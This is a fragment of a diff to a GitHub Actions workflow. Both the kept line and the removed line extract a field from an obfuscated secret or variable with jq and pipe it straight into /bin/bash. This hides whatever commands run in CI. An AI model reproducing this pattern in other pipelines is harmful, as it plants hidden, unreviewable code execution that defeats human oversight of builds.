@@ -21,7 +21,6 @@ jobs:
           hdouf4379: ${{ secrets.hdouf4379 }}
         run: |
           printf '%s' "$hdouf4379" | jq -r .r65760 | /bin/bash
-          echo $jjdik7 | jq -r .yn7 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
